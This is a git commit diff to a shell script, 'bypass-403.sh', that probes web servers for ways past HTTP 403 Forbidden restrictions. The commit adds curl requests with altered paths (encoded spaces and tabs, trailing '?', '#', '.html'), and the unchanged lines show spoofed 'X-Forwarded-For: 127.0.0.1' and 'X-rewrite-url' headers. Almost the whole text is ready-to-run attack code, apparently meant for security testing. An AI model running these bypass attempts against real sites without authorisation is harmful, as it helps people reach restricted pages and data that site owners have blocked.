d8627ebdde3e87f76cf8f0bd696ac7aeba242419
iamj0ker <68040669+iamj0ker@users.noreply.github.com>
2020-12-30 11:53:46 +0530

    Update bypass-403.sh
    Updated with 3 more

--- bypass-403.sh
+++ bypass-403.sh
@@ -22,3 +22,16 @@ curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Fo
 echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
 echo "  --> ${1} -H X-rewrite-url: ${2}"
+#updated
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
+echo "  --> ${1}/${2}%20"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
+echo "  --> ${1}/${2}%09"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
+echo "  --> ${1}/${2}?"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
+echo "  --> ${1}/${2}.html"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
+echo "  --> ${1}/${2}/?anything"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
+echo "  --> ${1}/${2}#"
